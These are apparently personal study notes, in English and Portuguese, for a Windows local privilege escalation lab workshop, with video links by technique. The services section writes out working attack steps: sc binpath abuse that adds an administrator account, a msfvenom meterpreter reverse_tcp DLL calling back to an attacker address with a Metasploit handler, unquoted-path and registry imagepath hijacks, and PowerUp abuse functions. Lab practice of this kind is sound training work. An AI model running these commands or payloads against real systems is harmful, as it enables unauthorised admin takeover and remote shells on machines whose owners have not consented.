source: https://github.com/sagishahar/lpeworkshop

# Kernel

    01 - Kernel 

01 Video: https://www.youtube.com/watch?v=HTM-BavQvs4&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=2&t=0s

----------------------------------------------------------------------------------------------------------------------------------------
# Services

    01 - Services (binPath)

    02 - Services (DLL Hijacking)

    03 - Services (Unquoted Path)

    04 - Services (Registry)

    05 - Services (Executable File)


01 - https://www.youtube.com/watch?v=7KjCTmSb1PM&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=3&t=0s

## Exercises:

### 01 - Exploitation - Services (binPath)

Scripts for WPE

    Powerless
    PowerUp
    Sherlock / Watson
    JAWS
    SharpUp

#### Using powershell with PowerUP.ps1

> Import-Module .\PowerUp.ps1

> Get-ModifiableService

AbuseFunction

> Invoke-ServiceAbuse -Name 'daclsvc'

Next, check user John added with permissions Administrator.

> net user

#### Using CMD 

> accesschk64.exe -wuvcq user *

> sc config daclsvc binpath= "net user anakein pass1234 /add"

> sc stop daclsvc

> sc start daclsvc

> sc config daclsvc binpath= "net user localgroup administradors anakein /add"

Start service

> sc start daclsvc

List users in administrators group

> net localgroup administrators

----------------------------------------------------------------------------------------------------------------------------------------
### 02 - Exploitation - Services (DLL Hijacking)

List services and search any suspect

> net start

(DLL Hijack Service) parece ser suspect.

Depois, procure o nome desse service suspect. No exemplo usamos o (DLL Hijack Service)

> sc queryex type= service state= all |findstr /i "DLL"

Encontramos algumas strings que possuem o nome "DLL", vamos verificar as relacoes entre eles. Alem do (dllsvc) que encontrei, existia mais outros 2. Vou comecar por ele entao.

> sc qc dllsvc

Bom, na descricao ele encontra-se vinculado com o (DLL Hijack Service), que no caso eh referente ao PATH.

Precisamos encontrar agora a dll equivalente ao servico.


###
gerando a dll maliciosa para ser substituida e carregada com o servico for iniciado novamente.

> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.17 LPORT=53 -f dll > nomedadll_relacionada_E_ser_substituida.dll

a dll gerada (nomedadll_relacionada_E_ser_substituida.dl) por ser adicionada no C:\TEMP, quando for iniciado o servico suspeito, ganharemos nossa shell, mas antes eh preciso deixa o modo handler ativo no MSFCONSOLE

agora iniciamos o modo handler.

> use exploit/multi/handler

    set PAYLOAD windows/x64/meterpreter/reverse_tcp

    set LHOST 192.168.0.17

    set LPORT 53

    exploit

### 03 - Exploitation - Services (Unquoted Path)

CMD
> wmic service get name,pathname,startmode,startname | findstr /i "localsystem" | findstr /v /i "disable" | findstr /i /v "C:\\windows" | findstr /v """

PowerShell
> Get-WmiObject win32_service | select Name,PathName,StartMode,StartName | where {$_.StartMode -ne "Disable" -and $_.StartName -eq "LocalSystem" -and $_.PathName -notmatch "`"" -and $_.PathName -notmatch "C:\\Windows"}


PowerUp

> powershell.exe -nop -ep bypass

> Import-Module .\PowerUp.ps1

> Get-ServiceUnquoted


O nome do servico, tem que ser referente ao nome inicial do PATH UNQUOTED.
exemplo: [ C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe ] nesse caso o nome que vamos usar em nosso service eh Common.exe

Criamos entao nosso payload usando o msfvenon

> msfvenom -p windows/exec CMD="net user ank pass1234 /add" -f exe-service -o common.exe

Transferimos para nossa maquina alvo e adicionamos nosso payload no directorio.

> C:\Program Files\Unquoted Path Service\Common Files\

Agora, paramos o servico e damos start novamente.

> sc stop unquotedsvc

> sc start unquotedsvc

POW!! temos nosso priv esc. no caso adicionamos o user (ank).

Agora vamos reperir os passos anteriores e add nosso user (ank) no grupo de ADMINISTRATORS

criamos novamente nosso payload, mas agora com o comando para add ao grupo.

> msfvenom -p windows/exec CMD="net localgroup administrators ank /add" -f exe-service -o common.exe

Transferimos para nossa maquina alvo e adicionamos nosso payload no directorio.

> C:\Program Files\Unquoted Path Service\Common Files\

Agora, paramos o servico e damos start novamente.

> sc stop unquotedsvc

> sc start unquotedsvc


#### Usando o PowerUp com a funcao Write-ServiceBinary

> Write-ServiceBinary -Name unquotedsvc -Path 'C:\Program Files\Unquoted Path Service\Common Files'
 
Foi criado um user JOHN (john Password123!) e adicionado no grupo de administrators.

### 04 - Exploitation - Services (Registry)

#### Detection

Using PowerShell

> Get-Acl HKLM:\SYSTEM\CurrentControlSet\services\regsvc | fl

Using AccessChk (Sysinternals)

> .\accesschk64.exe -kvusw hklm\system\currentcontrolset\services

or 

> .\accesschk64.exe "Everyone" -kvuqsw hklm\System\CurrentControlSet\services

#### Exploitation

Source: https://www.hackingtutorials.org/exploit-tutorials/mingw-w64-how-to-compile-windows-exploits-on-kali-linux/

Installing Mingw-w64 on Kali Linux

> apt-get update

> apt-get install mingw-w64

Compile

> x86_64-w64-mingw32-gcc windows_service.c -o x.exe

Transfer file for target machine <<<<

Copy file for dir TEMP

> reg.exe add hklm\system\currentcontrolset\services\regsvc /v imagepath /t reg_expand_sz /d c:\temp\x.exe /f

Start service

> sc.exe start regsvc

Check now the user added in administrators groups

> net user user




----------------------------------------------------------------------------------------------------------------------------------------
02 - https://www.youtube.com/watch?v=9s8jYwx9FSA&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=4&t=0s

03 - https://www.youtube.com/watch?v=b5Tbgl_Nd-g&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=5&t=0s

04 - https://www.youtube.com/watch?v=b5Tbgl_Nd-g&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=5&t=0s

05 - https://www.youtube.com/watch?v=TDgQzcjFeME&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=6&t=0s

06 - https://www.youtube.com/watch?v=yDGt7O87Zn0&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=7&t=0s


# Registry

    01 - Registry (Autorun)
     
    02 - Registry (AlwaysInstallElevated)
 
01 - https://www.youtube.com/watch?v=4W35tw_Di8k&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=8&t=0s

02 - https://www.youtube.com/watch?v=9LpsofQN_ao&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=9&t=0s

# Password Mining
     
    01 - Password Mining (Memory)

    02 - Password Mining (Registry)
     
    03 - Password Mining (Configuration Files)

01 - https://www.youtube.com/watch?v=2fF4Xre-w2g&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=11&t=0s

02 - https://www.youtube.com/watch?v=2fF4Xre-w2g&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=11&t=0s

03 - https://www.youtube.com/watch?v=sm9xgpgaEQw&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=12&t=0s

# Hot Potato

    01 - Hot Potato
    
01 - https://www.youtube.com/watch?v=EtxQGO58zp4&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=13&t=0s
     
# Scheduled Tasks 

    01 - Scheduled Tasks (Missing Binary)

01 - https://www.youtube.com/watch?v=Kgga91U3B4s&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=14&t=0s

# Startup Applications

    01 - Startup Applications

01 - https://www.youtube.com/watch?v=UnrFo8W-l3M&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=15&t=0s

----------------------------------------------------------------------------------------------------------------------------------------

Reference:

https://ivanitlearning.wordpress.com/2019/07/26/scripts-for-windows-privilege-escalation/

https://medium.com/@orhan_yildirim/windows-privilege-escalation-insecure-service-permissions-e4f33dbff219

https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/

https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_windows.html


Downloads .ISO's for labs:

https://archive.org/advancedsearch.php




